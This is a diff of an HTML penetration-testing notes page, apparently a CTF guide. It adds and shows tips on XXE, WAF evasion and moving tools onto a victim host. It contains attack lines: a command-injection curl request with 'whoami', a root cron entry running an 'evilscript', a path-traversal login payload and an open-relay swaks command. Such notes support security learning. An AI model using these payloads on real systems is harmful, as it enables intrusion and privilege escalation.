+<li><p class="first">If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)</p>
 </li>
 <li><p class="first">Want to send a email via the SMTP server something like SMTP-Open-Relay utilize <a class="reference external" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> Swiss Army Knife for SMTP.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body &quot;Hey Buddy How are you doing&quot; --header &quot;Subject: Hello! Long time&quot;
@@ -3190,6 +3443,19 @@ print &quot;* * * * * root /bin/bash /home/username/evilscript&quot;
 <div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;`ps aux --sort -rss`&quot;
 </pre></div>
 </div>
+</li>
+<li><p class="first">If there’s a XXE on a website and possible RFI using internal address i.e on <a class="reference external" href="http://127.0.0.1:80/home=RFI">http://127.0.0.1:80/home=RFI</a> rather than <a class="reference external" href="http://10.10.10.10:80/home=RFI">http://10.10.10.10:80/home=RFI</a>, utilize XXE to send the request with localaddress.</p>
+</li>
+<li><p class="first">If there’s a possible command execution on a website such as</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>curl -A &quot;bitvijays&quot; -i &quot;http://IPAddress/example?parameter=&#39; whoami&#39;&quot;
+</pre></div>
+</div>
+<p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a>
+Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.</p>
+</li>
+<li><p class="first">Similar to ls there is dir in linux. Try “dir -l” Might be helpful sometimes.</p>
+</li>
+<li><p class="first">Sometimes, we don’t have tools on the victim machine, in that case we can download static binaries from <a class="reference external" href="https://github.com/andrew-d/static-binaries">Static-Binaries</a> If not, found, try the deb or rpm package of the binary, extract it and upload.</p>
 </li>
 <li><p class="first">Handy Stuff</p>
 </li>
@@ -3497,7 +3763,7 @@ login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../va
 </div>
 </div>
 <div class="section" id="appendix-ii-file-upload">
-<span id="a2-file-upload"></span><h2>Appendix-II File Upload<a class="headerlink" href="#appendix-ii-file-upload" title="Permalink to this headline">¶</a></h2>
+<span id="a2-file-upload"></span><h2>Appendix-II : File Upload<a class="headerlink" href="#appendix-ii-file-upload" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="examples">
 <h3>Examples<a class="headerlink" href="#examples" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="simple-file-upload">
